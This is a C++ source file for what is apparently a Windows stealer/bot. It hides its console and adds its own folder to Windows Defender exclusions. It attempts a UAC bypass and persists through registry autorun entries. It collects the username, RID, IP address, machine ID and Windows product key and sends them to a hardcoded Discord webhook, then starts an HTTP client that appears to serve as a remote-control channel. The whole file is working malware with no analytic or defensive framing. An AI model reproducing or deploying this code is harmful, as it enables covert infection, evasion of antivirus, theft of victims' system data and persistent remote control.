#include <iostream>
#include "Module/Logger.hpp"
#include "Extension/Payload/Payload.hpp"
#include "Extension/GetDevice/Hardware.hpp"
#include "Extension/Bot/HttpClient.hpp"
#include "Module/AutoElevate.hpp"

using namespace std;

const string webhook_url = "https://discord.com/api/webhooks/1309489093352099881/tGCASYnWKaknrflUG_Eh_wNoL-H9wP4qM2k9EskcXqoGSyr94qXL43xC8H2LgSgD9Kgw";

string username = Hardware::GetUsername();
string ipAddress = Hardware::GetIPAddress();
string machineID = Hardware::GetMachineID();
string rid = Hardware::GetRelativeIdentifier();
string windowsVersion = Hardware::GetWindowsVersion();
string windowsKey = Hardware::GetWindowsKey();
string profilePicPath = Hardware::GetUserProfilePicture();

void Exclusion(const std::string& path) {
    std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";

    int result = system(command.c_str());

    if (result == 0) {
        Logger::getInstance()->info("Successfully added to Windows Defender exclusion: " + path);
    }
    else {
        Logger::getInstance()->expection("Failed to add exclusion. Make sure you run this program as Administrator");
        std::cerr << "Failed to add exclusion. Make sure you run this program as Administrator.\n";
    }
}

std::string getExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

int main() {
    try {
        HWND console = GetConsoleWindow();
        ShowWindow(console, SW_HIDE);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        SetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), 0);
        SetConsoleMode(GetStdHandle(STD_ERROR_HANDLE), 0);

        std::string executable = getExecutablePath();
        
        std::string Dir = executable.substr(0, executable.find_last_of("\\/"));

        Exclusion(Dir);

        Logger::getInstance()->info("Program started");

        if (!AutoElevate::isAdmin()) {
            Logger::getInstance()->info("Not running as admin, attempting to elevate");
            if (AutoElevate::bypassUAC()) {
                Logger::getInstance()->info("UAC bypass successful");

                HKEY hKey;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                    0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

                    std::string exePath = AutoElevate::getExecutablePath();
                    RegSetValueExA(hKey, "Kukuri", 0, REG_SZ,
                        (BYTE*)exePath.c_str(), exePath.length() + 1);
                    RegCloseKey(hKey);
                }
            }
            else {
                Logger::getInstance()->warning("UAC bypass failed");
            }
            return 0;
        }
        Logger::getInstance()->info("Running as admin");
       
        //AutoElevate::elevatePrivileges();
        
        if (!AutoElevate::setAutoRun()) {
            Logger::getInstance()->warning("Failed to set auto run");
        }

        Logger::getInstance()->info("Injector started!");

        // Sending Information
        Payload::SendMessage(webhook_url, "```ini\n"
            "[User Information]\n"
            "Username   : " + username + "\n"
            "RID        : " + rid + "\n\n"
            "[System Information]\n"
            "OS         : " + windowsVersion + "\n"
            "Product Key: " + windowsKey + "\n\n"
            "[Network Information]\n"
            "IP Address : " + ipAddress + "\n"
            "Machine ID : " + machineID + "\n"
            "```");

        // Initialize
        Logger::getInstance()->load("Initialize HTTP Client...");

        // Start
        Logger::getInstance()->load("Starting HTTP Client...");

        HttpClient client;
        client.start();

        return 0;
    }
    catch (const exception& e) {
        Logger::getInstance()->expection(e.what());
        return 1;
    }
}